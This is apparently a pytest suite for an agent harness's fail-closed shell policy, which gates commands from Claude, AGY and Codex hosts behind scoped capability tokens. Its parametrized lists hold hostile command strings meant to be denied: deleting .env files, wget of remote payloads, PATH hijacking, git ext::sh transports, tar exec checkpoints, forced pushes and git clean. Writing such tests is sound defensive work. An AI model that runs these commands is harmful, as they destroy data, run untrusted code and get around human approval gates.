"""Fail-closed shell-policy contracts shared by Claude, AGY, and Codex."""

from __future__ import annotations

import io
import json
import os
import stat
import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from solomon_harness import cli, workflows
from solomon_harness.host_hooks import extract_shell_write_paths
from solomon_harness.loop_lock import (
    SHELL_CAPABILITY_ENV,
    LoopLock,
)
from solomon_harness.loop_policy import LoopPolicy


HOSTS = ("claude", "agy", "codex")


def _shell_payload(host: str, command: str, session_id: str = "native-session") -> dict:
    if host == "claude":
        return {
            "session_id": session_id,
            "tool_name": "Bash",
            "tool_input": {"command": command},
        }
    if host == "agy":
        return {
            "conversationId": session_id,
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": command},
            },
        }
    return {
        "sessionId": session_id,
        "tool": "Bash",
        "input": {"command": command},
    }


def _write_payload(host: str, path: str) -> dict:
    if host == "claude":
        return {
            "session_id": "native-session",
            "tool_name": "Write",
            "tool_input": {"file_path": path},
        }
    if host == "agy":
        return {
            "conversationId": "native-session",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": path},
            },
        }
    return {
        "sessionId": "native-session",
        "tool": "Write",
        "input": {"file_path": path},
    }


def _verdict(
    root: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
    *,
    token: str | None = None,
    session_id: str = "driver-session",
    policy_level: str = "human",
) -> tuple[bool, str]:
    monkeypatch.setenv("SOLOMON_SUBPROCESS", "1")
    monkeypatch.setenv("SOLOMON_SESSION_ID", session_id)
    if token is None:
        monkeypatch.delenv(SHELL_CAPABILITY_ENV, raising=False)
    else:
        monkeypatch.setenv(SHELL_CAPABILITY_ENV, token)
    stdout = io.StringIO()
    stderr = io.StringIO()
    policy = LoopPolicy(str(root), level=policy_level, denylist=[])
    with patch.object(LoopPolicy, "from_config", return_value=policy):
        exit_code = cli.handle_host_hook(
            str(root),
            host,
            "pre-tool-use",
            stdin=io.StringIO(json.dumps(_shell_payload(host, command))),
            stdout=stdout,
            stderr=stderr,
        )
    if host == "agy":
        output = json.loads(stdout.getvalue())
        return output["decision"] == "allow", output["reason"]
    return exit_code == 0, stderr.getvalue()


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize(
    "command",
    [
        "rsync source .agents/solomon/config/project.json",
        "tar -cf .agents/solomon/config/project.json source",
        "openssl enc -out .agents/solomon/config/project.json",
        "awk 'BEGIN { system(\"rm .env\") }'",
        "awk '{ print }' README.md > .agents/solomon/config/project.json",
        "perl -e 'unlink q(.env)'",
        "ruby -e 'File.unlink(\".env\")'",
        "python -c 'open(\".env\", \"w\").close()'",
        "node -e 'require(\"fs\").unlinkSync(\".env\")'",
        "bash scripts/arbitrary.sh",
        "sh scripts/arbitrary.sh",
        "zsh scripts/arbitrary.sh",
        "python scripts/arbitrary.py",
        "node scripts/arbitrary.js",
        "ruby scripts/arbitrary.rb",
        "custom-sync --output .agents/solomon/config/project.json",
        "env custom-sync --output .agents/solomon/config/project.json",
        "command custom-sync --output .agents/solomon/config/project.json",
        "nice custom-sync --output .agents/solomon/config/project.json",
        "sudo custom-sync --output .agents/solomon/config/project.json",
        "busybox custom-sync .agents/solomon/config/project.json",
        "printf '%s\\n' .env | xargs rm",
        "rm .ag*",
        "rm .agents/*",
        "rm ~/.x",
        "rm prefix$TARGET",
        "find . -delete",
        "rsync payload/ .",
        "cp payload/.env .",
        "tar -xf payload.tar",
        "patch -p0 < malicious.patch",
        "wget https://example.invalid/payload",
        "wget -P .agents/solomon/config https://example.invalid/payload",
        "find src -fprintf .agents/solomon/config/project.json '%p\\n'",
        "rsync --remove-source-files payload/ build/",
        "PATH=./evil git status",
        "GIT_CONFIG_COUNT=1 git status",
        "env PATH=./evil git status",
        "./git status",
        "/tmp/ls",
        "sort -o .agents/solomon/config/project.json README.md",
        "uniq README.md .agents/solomon/config/project.json",
        "diff --output=.agents/solomon/config/project.json a b",
        "tree -o .agents/solomon/config/project.json .",
        "yq -i '.x = 1' .agents/solomon/config/project.json",
        "cat <> .agents/solomon/config/project.json",
        "cd",
        "cd -",
        "rg --pre ./evil pattern .",
        "git grep --open-files-in-pager=./evil pattern",
        "git diff --ext-diff",
        "git log --ext-diff",
        "git show --ext-diff HEAD",
        "git ls-remote ext::sh",
        "curl -K malicious.cfg https://example.invalid",
        "wget --config=malicious.cfg https://example.invalid",
        "tar -cf build/archive.tar --checkpoint-action=exec=./evil source",
        "tar -cf build/archive.tar --use-compress-program=./evil source",
        "rsync -e ./evil source host:/target",
        "sed -e 's/x/y/e' README.md",
        (
            "UV_PROJECT_ENVIRONMENT=.agents/solomon/state/venv "
            "uv run --project .agents/solomon python -m "
            "solomon_harness.cli dev review 288"
        ),
    ],
)
def test_opaque_or_unclassified_shell_forms_fail_closed_for_every_host(
    tmp_path: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    allowed, reason = _verdict(tmp_path, host, command, monkeypatch)

    assert not allowed
    assert reason


@pytest.mark.parametrize(
    "command",
    [
        "pwd",
        "ls -la src",
        "cat README.md",
        "rg -n policy solomon_harness",
        "git status --short",
        "git diff --stat",
        "git log -1 --oneline",
        "printf '%s\\n' safe",
        "find src -name '*.py' -print",
    ],
)
def test_explicit_read_only_shell_forms_remain_available(command: str) -> None:
    assert extract_shell_write_paths(command) == ()


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("rsync source build/output", ("build/output",)),
        ("tar -cf build/archive.tar source", ("build/archive.tar",)),
        ("openssl enc -out build/data.enc", ("build/data.enc",)),
        ("touch src/new.py", ("src/new.py",)),
    ],
)
def test_known_mutators_keep_statically_extracting_targets(
    command: str, expected: tuple[str, ...]
) -> None:
    assert extract_shell_write_paths(command) == expected


def _git_workspace(root: Path) -> None:
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=root, check=True)
    subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=root, check=True)
    subprocess.run(["git", "config", "user.name", "Test"], cwd=root, check=True)
    (root / "README.md").write_text("test\n", encoding="utf-8")
    subprocess.run(["git", "add", "README.md"], cwd=root, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=root, check=True)
    subprocess.run(["git", "switch", "-q", "-c", "feature/safe"], cwd=root, check=True)


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize(
    "command",
    [
        "git add src/app.py",
        "git commit -m change",
        "git commit -am change",
        "git -C . commit -am change",
        "git push origin feature/safe",
        "git fetch origin",
        "git branch feature/next",
        "git switch -c feature/next",
        "git checkout -b feature/next",
    ],
)
def test_scoped_capability_allows_delivery_git_operations_for_every_host(
    tmp_path: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _git_workspace(tmp_path)
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="start").acquire()
    try:
        token = lock.issue_shell_capability(
            scopes={
                "git:add",
                "git:branch",
                "git:checkout",
                "git:commit",
                "git:fetch",
                "git:push",
                "git:switch",
                "git:worktree",
            },
            branches={"feature/*"},
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            command,
            monkeypatch,
            token=token,
        )
        assert allowed, reason
    finally:
        lock.release()


@pytest.mark.parametrize("host", HOSTS)
def test_scoped_capability_only_allows_the_deterministic_sibling_worktree(
    tmp_path: Path,
    host: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _git_workspace(tmp_path)
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="start").acquire()
    try:
        token = lock.issue_shell_capability(
            scopes={"git:worktree"},
            branches={"feature/*"},
        )
        target = (
            tmp_path.parent
            / f"{tmp_path.name}-worktrees"
            / "feature-next"
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            f"git worktree add -b feature/next {target} main",
            monkeypatch,
            token=token,
        )
        assert allowed, reason
    finally:
        lock.release()


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize(
    "command",
    [
        "git add src/app.py",
        "git commit -m change",
        "git commit -am change",
        "git -C . commit -am change",
        "git push origin feature/safe",
        "git -c advice.detachedHead=false push origin feature/safe",
        "git --git-dir=.git commit -m change",
        "git --work-tree=. commit -m change",
        "git fetch origin",
        "git branch feature/next",
        "git switch -c feature/next",
        "git checkout -b feature/next",
        "git worktree add -b feature/next ../next main",
        "git tag v1.0.0",
        "git rebase main",
        "git cherry-pick deadbeef",
        "git pull origin main",
        "git config user.name attacker",
        "git reset --hard",
        "git restore .",
        "git clean -fdx",
        "git rm README.md",
        "git mv README.md moved.md",
        "git apply change.patch",
    ],
)
def test_mutating_git_without_a_trusted_capability_fails_closed_for_every_host(
    tmp_path: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _git_workspace(tmp_path)
    allowed, reason = _verdict(tmp_path, host, command, monkeypatch)

    assert not allowed
    assert "capability" in reason.lower() or "denied" in reason.lower()


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize(
    "command",
    [
        "git merge main",
        "gh pr merge 288 --squash",
        "git push origin main",
        "git push --force origin feature/safe",
        "git push origin --delete feature/safe",
        "git -c alias.status=!touch status",
        "git --config-env=alias.status:ALIAS status",
        "git --exec-path=/tmp status",
        "git --git-dir=.git status",
        "git --work-tree=. status",
        "git branch -D feature/safe",
        "git push ext::sh feature/safe",
        "git checkout -b feature/next main -- README.md",
        "git switch -c feature/next main",
        "git fetch ext::sh",
        "git commit --amend -m rewritten",
        "git worktree add -b feature/next /tmp/out main",
    ],
)
def test_human_gates_and_unsafe_pushes_remain_denied_with_a_capability(
    tmp_path: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _git_workspace(tmp_path)
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="review").acquire()
    try:
        token = lock.issue_shell_capability(
            scopes={"git:commit", "git:push"},
            branches={"feature/*"},
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            command,
            monkeypatch,
            token=token,
        )
        assert not allowed
        assert reason
    finally:
        lock.release()


@pytest.mark.parametrize("host", HOSTS)
def test_capability_is_bound_to_the_lock_session(
    tmp_path: Path,
    host: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _git_workspace(tmp_path)
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="review").acquire()
    try:
        token = lock.issue_shell_capability(
            scopes={"git:commit"},
            branches={"feature/*"},
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            "git commit -m change",
            monkeypatch,
            token=token,
            session_id="different-session",
        )
        assert not allowed
        assert "capability" in reason.lower() or "identity" in reason.lower()
    finally:
        lock.release()


def test_capability_record_is_private_hashed_and_scope_bound(tmp_path: Path) -> None:
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="review").acquire()
    try:
        raw_token = lock.issue_shell_capability(
            scopes={"git:commit"},
            branches={"feature/*"},
        )
        body_text = Path(lock.path).read_text(encoding="utf-8")
        body = json.loads(body_text)
        record = body["shell_capability"]

        assert stat.S_IMODE(Path(lock.path).stat().st_mode) == 0o600
        assert raw_token not in body_text
        assert len(record["token_sha256"]) == 64
        assert record["scopes"] == ["git:commit"]
        assert record["branches"] == ["feature/*"]
        assert lock.shell_capability_allows(
            raw_token,
            scope="git:commit",
            branch="feature/safe",
        )
        assert not lock.shell_capability_allows(
            raw_token,
            scope="git:push",
            branch="feature/safe",
        )
        assert not lock.shell_capability_allows(
            raw_token,
            scope="git:commit",
            branch="main",
        )
        assert not lock.shell_capability_allows(
            "wrong-token",
            scope="git:commit",
            branch="feature/safe",
        )
    finally:
        lock.release()


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize(
    "command",
    [
        "uv run pytest -q",
        "npm test",
        "cargo test",
        "go test ./...",
        (
            "UV_PROJECT_ENVIRONMENT=.agents/solomon/state/venv "
            "uv run --project .agents/solomon solomon-harness dev review 288"
        ),
    ],
)
def test_development_code_execution_requires_a_live_capability(
    tmp_path: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    allowed, reason = _verdict(tmp_path, host, command, monkeypatch)

    assert not allowed
    assert "capability" in reason.lower()


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize(
    "command",
    [
        "uv run pytest -q",
        "solomon-harness dev review 288",
        (
            "UV_PROJECT_ENVIRONMENT=.agents/solomon/state/venv "
            "uv run --project .agents/solomon solomon-harness dev review 288"
        ),
        (
            "UV_PROJECT_ENVIRONMENT=.agents/solomon/state/venv "
            "uv run --frozen --project .agents/solomon python -I -m "
            "solomon_harness.cli dev review 288"
        ),
        "uv sync",
        "python manage.py migrate",
        "npm install",
        "npm run build",
        "docker compose build",
        "make test",
    ],
)
def test_live_capability_explicitly_grants_development_code_execution(
    tmp_path: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="review").acquire()
    try:
        token = lock.issue_shell_capability(
            scopes={"dev:execute"},
            branches=set(),
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            command,
            monkeypatch,
            token=token,
        )
        assert allowed, reason
    finally:
        lock.release()


@pytest.mark.parametrize("host", HOSTS)
def test_github_mutation_requires_a_non_l1_capability(
    tmp_path: Path,
    host: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="workflow").acquire()
    try:
        read_only_token = lock.issue_shell_capability(
            scopes={"harness:read"},
            branches=set(),
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            "gh issue edit 42 --title updated",
            monkeypatch,
            token=read_only_token,
        )
        assert not allowed
        assert "gh:mutate" in reason

        delivery_token = lock.issue_shell_capability(
            scopes={"gh:mutate"},
            branches=set(),
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            "gh issue edit 42 --title updated",
            monkeypatch,
            token=delivery_token,
        )
        assert allowed, reason
    finally:
        lock.release()


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize(
    "command",
    ["touch src/new.py", "rm README.md", "printf x > src/new.py"],
)
def test_l1_report_only_denies_every_local_shell_write(
    tmp_path: Path,
    host: str,
    command: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="workflow").acquire()
    try:
        token = lock.issue_shell_capability(
            scopes={"harness:read"},
            branches=set(),
        )
        allowed, reason = _verdict(
            tmp_path,
            host,
            command,
            monkeypatch,
            token=token,
            policy_level="L1",
        )
        assert not allowed
        assert "report-only" in reason

        allowed, reason = _verdict(
            tmp_path,
            host,
            "cat README.md",
            monkeypatch,
            token=token,
            policy_level="L1",
        )
        assert allowed, reason
    finally:
        lock.release()


@pytest.mark.parametrize("host", HOSTS)
def test_l1_report_only_denies_native_write_tools(
    tmp_path: Path,
    host: str,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    lock = LoopLock(str(tmp_path), session_id="driver-session", stage="workflow").acquire()
    try:
        token = lock.issue_shell_capability(
            scopes={"harness:read"},
            branches=set(),
        )
        monkeypatch.setenv("SOLOMON_SUBPROCESS", "1")
        monkeypatch.setenv("SOLOMON_SESSION_ID", "driver-session")
        monkeypatch.setenv(SHELL_CAPABILITY_ENV, token)
        stdout = io.StringIO()
        stderr = io.StringIO()
        policy = LoopPolicy(str(tmp_path), level="L1", denylist=[])
        with patch.object(LoopPolicy, "from_config", return_value=policy):
            exit_code = cli.handle_host_hook(
                str(tmp_path),
                host,
                "pre-tool-use",
                stdin=io.StringIO(json.dumps(_write_payload(host, "src/new.py"))),
                stdout=stdout,
                stderr=stderr,
            )
        if host == "agy":
            output = json.loads(stdout.getvalue())
            assert output["decision"] == "deny"
            assert "report-only" in output["reason"]
        else:
            assert exit_code == 2
            assert "report-only" in stderr.getvalue()
    finally:
        lock.release()


def test_run_stage_emits_a_scoped_capability_to_every_engine(tmp_path: Path) -> None:
    _git_workspace(tmp_path)
    workflow = tmp_path / ".agents" / "solomon" / "workflows" / "solomon-review.md"
    workflow.parent.mkdir(parents=True)
    workflow.write_text("Review {{arguments}}.\n", encoding="utf-8")

    for engine in HOSTS:
        seen: dict[str, str] = {}

        class _Proc:
            returncode = 0

        def fake_run(command, *args, **kwargs):
            if command and os.path.basename(command[0]) in HOSTS:
                env = kwargs["env"]
                seen.update(env)
                active = LoopLock(str(tmp_path), session_id=env["SOLOMON_SESSION_ID"])
                assert active.shell_capability_allows(
                    env[SHELL_CAPABILITY_ENV],
                    scope="git:commit",
                    branch="feature/safe",
                )
            return _Proc()

        with patch("subprocess.run", side_effect=fake_run):
            assert workflows.run_stage(str(tmp_path), "review", ["288"], engine=engine) == 0

        assert seen["SOLOMON_SUBPROCESS"] == "1"
        assert seen[SHELL_CAPABILITY_ENV]


def test_every_stage_propagates_identity_and_capability_to_every_engine(
    tmp_path: Path,
) -> None:
    _git_workspace(tmp_path)
    workflow_root = tmp_path / ".agents" / "solomon" / "workflows"
    workflow_root.mkdir(parents=True)
    for stage in workflows.STAGES:
        prompt_stage = "workflow" if stage == "loop" else stage
        (workflow_root / f"solomon-{prompt_stage}.md").write_text(
            f"Run {stage} {{arguments}}.\n",
            encoding="utf-8",
        )

    assert workflows.LOCKED_STAGES == set(workflows.STAGES)
    for engine in HOSTS:
        for stage in workflows.STAGES:
            seen: dict[str, str] = {}

            class _Proc:
                returncode = 0

            def fake_run(command, *args, **kwargs):
                if command and os.path.basename(command[0]) in HOSTS:
                    seen.update(kwargs["env"])
                return _Proc()

            with patch("subprocess.run", side_effect=fake_run):
                result = workflows.run_stage(
                    str(tmp_path),
                    stage,
                    ["target"],
                    engine=engine,
                )
            if stage == "release":
                assert result == 3
                assert not seen
                continue
            assert result == 0

            assert seen["SOLOMON_SUBPROCESS"] == "1"
            assert seen["SOLOMON_SESSION_ID"]
            assert seen[SHELL_CAPABILITY_ENV]


def test_l1_workflow_capability_is_read_only(tmp_path: Path) -> None:
    _git_workspace(tmp_path)
    workflow = tmp_path / ".agents" / "solomon" / "workflows" / "solomon-workflow.md"
    workflow.parent.mkdir(parents=True)
    workflow.write_text("Report only.\n", encoding="utf-8")
    config = tmp_path / ".agent" / "config.json"
    config.parent.mkdir()
    config.write_text(
        json.dumps({"agent_name": "test", "loop": {"autonomy": "L1"}}),
        encoding="utf-8",
    )
    verified = False

    class _Proc:
        returncode = 0

    def fake_run(command, *args, **kwargs):
        nonlocal verified
        if command and os.path.basename(command[0]) == "claude":
            env = kwargs["env"]
            active = LoopLock(str(tmp_path), session_id=env["SOLOMON_SESSION_ID"])
            raw_token = env[SHELL_CAPABILITY_ENV]
            assert active.shell_capability_allows(
                raw_token,
                scope="harness:read",
            )
            assert not active.shell_capability_allows(
                raw_token,
                scope="git:commit",
                branch="feature/safe",
            )
            assert not active.shell_capability_allows(
                raw_token,
                scope="git:push",
                branch="feature/safe",
            )
            assert not active.shell_capability_allows(
                raw_token,
                scope="dev:execute",
            )
            assert not active.shell_capability_allows(
                raw_token,
                scope="gh:mutate",
            )
            verified = True
        return _Proc()

    with patch("subprocess.run", side_effect=fake_run):
        assert workflows.run_stage(
            str(tmp_path),
            "workflow",
            [],
            engine="claude",
        ) == 0

    assert verified
